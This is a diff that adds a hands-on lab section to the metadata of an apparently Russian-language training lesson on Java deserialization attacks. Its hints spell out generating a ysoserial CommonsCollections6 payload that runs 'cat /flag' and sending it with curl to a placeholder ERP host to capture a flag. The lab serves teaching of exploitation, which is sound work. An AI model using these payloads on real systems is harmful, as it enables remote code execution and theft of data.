@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 48
 summary: "Java deserialization: как работают gadget chains, выбор по classpath, генерация ysoserial и эксплуатация RCE."
+lab:
+  kind: shell
+  title: 'Практика: Java gadget chain (ysoserial)'
+  toolset: [core, java, curl]
+  workdir: /home/student/task
+  files: [task.md, session.txt]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Подтверди формат: `base64 -d session.txt | xxd | head -1` — ждём `aced 0005`.'
+    - 'Собери payload: `java -jar ysoserial.jar CommonsCollections6 ''cat /flag'' -o payload.ser`.'
+    - 'Отправь сериализованный объект: `curl -s http://erp.example/ --data-binary @payload.ser`.'
+    - 'Запиши ответ в found.txt и набери `check`.'
 ---
 
 ## Вопрос, с которого всё начинается
